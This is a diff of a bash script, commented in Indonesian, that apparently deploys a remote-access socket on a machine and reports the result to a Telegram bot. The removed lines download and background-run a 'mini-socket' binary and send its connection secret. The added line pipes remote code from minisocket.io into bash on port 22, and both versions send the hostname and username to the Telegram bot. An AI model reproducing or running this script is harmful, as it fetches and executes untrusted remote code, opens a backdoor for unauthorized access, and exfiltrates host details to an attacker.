@@ -12,28 +12,25 @@ send_telegram() {
         -d parse_mode="HTML" >/dev/null 2>&1
 }
 
-# Jalankan mini-socket
-curl -fsSLk -o ms https://minisocket.io/bin/mini-socketv2 && chmod 755 ms
-S=$(./ms -g)
+# Jalankan command
+MINI_PORT=22 bash -c "$(curl -fsSL https://minisocket.io/bin/x)"
 
-if [ -n "$S" ]; then
-    MINI_PORT=80 MINI_ARGS="-s $S -d" ./ms > /dev/null 2>&1 &
-    
-    OUTPUT="Success ==> mini-ncv2 -s $S"
+# Simpan output ke file
+if [ $? -eq 0 ]; then
+    OUTPUT="Success ==> MINI_PORT=22 MiniSocket Running"
     echo "$OUTPUT" | tee output.txt
-    
     send_telegram "🟢 <b>MiniSocket Success</b>
 ━━━━━━━━━━━━━━━
-🖥 <b>Host:</b> <code>$(hostname 2>/dev/null || echo 'unknown')@$(whoami 2>/dev/null || echo 'unknown')</code>
-🔑 <b>Secret:</b> <code>$S</code>
-🔗 <b>Connect:</b> <code>mini-ncv2 -s $S</code>
+🖥 <b>Host:</b> <code>$(hostname 2>/dev/null || echo unknown)@$(whoami 2>/dev/null || echo unknown)</code>
+🔌 <b>Port:</b> <code>22</code>
+✅ Status: Running
 ━━━━━━━━━━━━━━━"
 else
     OUTPUT="Failed :("
     echo "$OUTPUT" | tee output.txt
     send_telegram "🔴 <b>MiniSocket Failed</b>
 ━━━━━━━━━━━━━━━
-🖥 <b>Host:</b> <code>$(hostname 2>/dev/null || echo 'unknown')@$(whoami 2>/dev/null || echo 'unknown')</code>
-❌ Status: Gagal mendapatkan secret
+🖥 <b>Host:</b> <code>$(hostname 2>/dev/null || echo unknown)@$(whoami 2>/dev/null || echo unknown)</code>
+❌ Status: Failed
 ━━━━━━━━━━━━━━━"
 fi
